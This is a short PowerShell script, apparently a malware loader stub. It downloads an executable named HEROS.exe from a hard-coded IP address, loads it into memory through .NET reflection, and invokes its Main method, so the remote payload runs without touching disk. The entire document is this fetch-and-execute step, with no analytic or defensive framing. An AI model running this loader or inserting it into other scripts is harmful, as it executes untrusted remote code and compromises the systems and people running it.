$data = (New-Object System.Net.WebClient).DownloadData('http://3.8.126.182/HEROS.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Client.Program]::Main("".Split())
